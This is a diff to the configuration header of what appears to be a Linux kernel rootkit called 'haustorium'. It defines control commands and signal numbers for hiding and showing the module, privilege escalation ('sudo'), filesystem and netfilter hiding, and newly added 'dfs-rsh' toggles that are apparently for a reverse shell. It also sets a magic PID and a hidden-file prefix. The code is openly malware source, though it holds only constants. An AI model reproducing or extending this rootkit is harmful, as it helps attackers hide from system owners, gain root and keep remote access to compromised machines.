@@ -1,7 +1,7 @@
 #ifndef HTM_CONFIG_H
 #define HTM_CONFIG_H
 
-#define HTM_DEBUG
+//#define HTM_DEBUG
 
 #define HTM_MAX_STRING 1024
 #define HTM_MAX_FILENAME 32
@@ -9,11 +9,13 @@
 
 #define HTM_CMD_EXEC            "exec"
 #define HTM_CMD_DISABLE_CDD     "disable-cdd"
-#define HTM_CMD_DISABLE_DEBUGFS "disable-debugfs"
+#define HTM_CMD_DISABLE_DFS     "disable-dfs"
+#define HTM_CMD_DISABLE_DFS_RSH "disable-dfs-rsh"
 #define HTM_CMD_DISABLE_FS      "disable-fs"
 #define HTM_CMD_DISABLE_NF      "disable-nf"
 #define HTM_CMD_ENABLE_CDD      "enable-cdd"
-#define HTM_CMD_ENABLE_DEBUGFS  "enable-debugfs"
+#define HTM_CMD_ENABLE_DFS      "enable-dfs"
+#define HTM_CMD_ENABLE_DFS_RSH  "enable-dfs-rsh"
 #define HTM_CMD_ENABLE_FS       "enable-fs"
 #define HTM_CMD_ENABLE_NF       "enable-nf"
 #define HTM_CMD_HIDE_MODULE     "hide-module"
@@ -24,17 +26,19 @@
 #define HTM_PID 46692 // Feigerbaum's constant
 
 #define HTM_SIG_DISABLE_CDD     1
-#define HTM_SIG_DISABLE_DEBUGFS 2
-#define HTM_SIG_DISABLE_FS      3
-#define HTM_SIG_DISABLE_NF      4
-#define HTM_SIG_ENABLE_CDD      5
-#define HTM_SIG_ENABLE_DEBUGFS  6
-#define HTM_SIG_ENABLE_FS       7
-#define HTM_SIG_ENABLE_NF       8
-#define HTM_SIG_HIDE_MODULE     9
-#define HTM_SIG_SHOW_MODULE     10
-#define HTM_SIG_STATUS          11
-#define HTM_SIG_SUDO            12
+#define HTM_SIG_DISABLE_DFS     2
+#define HTM_SIG_DISABLE_DFS_RSH 3
+#define HTM_SIG_DISABLE_FS      4
+#define HTM_SIG_DISABLE_NF      5
+#define HTM_SIG_ENABLE_CDD      6
+#define HTM_SIG_ENABLE_DFS      7
+#define HTM_SIG_ENABLE_DFS_RSH  8
+#define HTM_SIG_ENABLE_FS       9
+#define HTM_SIG_ENABLE_NF       10
+#define HTM_SIG_HIDE_MODULE     11
+#define HTM_SIG_SHOW_MODULE     12
+#define HTM_SIG_STATUS          13
+#define HTM_SIG_SUDO            14
 
 #define HTM_FS_STRING ".haustorium"
 
